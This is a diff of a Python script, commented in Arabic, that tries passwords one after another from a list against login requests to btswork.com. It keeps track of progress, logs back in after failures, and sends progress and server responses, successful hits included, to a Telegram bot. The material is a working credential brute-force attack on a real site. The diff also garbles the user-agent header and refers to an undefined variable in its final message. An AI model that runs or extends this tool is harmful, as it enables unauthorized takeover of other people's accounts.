@@ -8,7 +8,7 @@ headers = {
     'content-type': 'application/x-www-form-urlencoded',
     'origin': 'https://btswork.com',
     'referer': 'https://btswork.com/',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, مثل Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
 # ملفات البيانات
@@ -50,7 +50,6 @@ if last_line >= len(passwords):
     print("✅ تم تجربة جميع كلمات المرور.")
     exit()
 
-
 # دالة إرسال إشعار إلى تيليجرام
 def send_telegram_message(message):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
@@ -59,7 +58,6 @@ def send_telegram_message(message):
         requests.post(url, data=data)
     except requests.exceptions.RequestException as e:
         print(f"⚠️ خطأ أثناء إرسال رسالة تيليجرام: {e}")
-
 
 # دالة إعادة تسجيل الدخول
 def relogin():
@@ -78,7 +76,6 @@ def relogin():
     except requests.exceptions.RequestException as e:
         print(f"⚠️ خطأ أثناء تسجيل الدخول: {e}")
     return False
-
 
 # دالة تجربة كلمة المرور
 def try_password(password_index):
@@ -113,9 +110,10 @@ def try_password(password_index):
                 try_password(password_index)  # إعادة التجربة بعد تسجيل الدخول
             return
 
-        # إرسال إشعار بعد كل 100 محاولة
+        # إرسال إشعار بعد كل 100 محاولة مع الرد الأخير
         if password_index % 100 == 0:
-            send_telegram_message(f"📊 تمت تجربة {password_index} كلمة مرور حتى الآن.")
+            last_response = response.text[:400]  # تقليل حجم الرد إذا كان كبيرًا
+            send_telegram_message(f"📊 تمت تجربة {password_index} كلمة مرور.\n\n🔹 **آخر رد:**\n```{last_response}```")
 
         # إذا كان "code_dec" يساوي 1، احفظ الرد وأرسل إشعارًا
         if response_json.get("code_dec") == 1:
@@ -140,9 +138,11 @@ Response: {json.dumps(response_json, ensure_ascii=False)}
     with open(progress_file, "w") as pf:
         pf.write(str(password_index + 1))
 
-
 # تجربة كلمات المرور بشكل متسلسل
 for i in range(last_line, len(passwords)):
-    try_password(i)  # تجربة كلمة المرور بشكل متسلسل
+    try_password(i)
+
+# بعد انتهاء كل الباسوردات، إرسال آخر رد تم تسجيله
+send_telegram_message(f"✅ تمت تجربة جميع كلمات المرور!\n🔹 **آخر رد:**\n```{response.text[:400]}```")
 
 print("✅ تمت تجربة جميع كلمات المرور أو انتهاء العملية.")
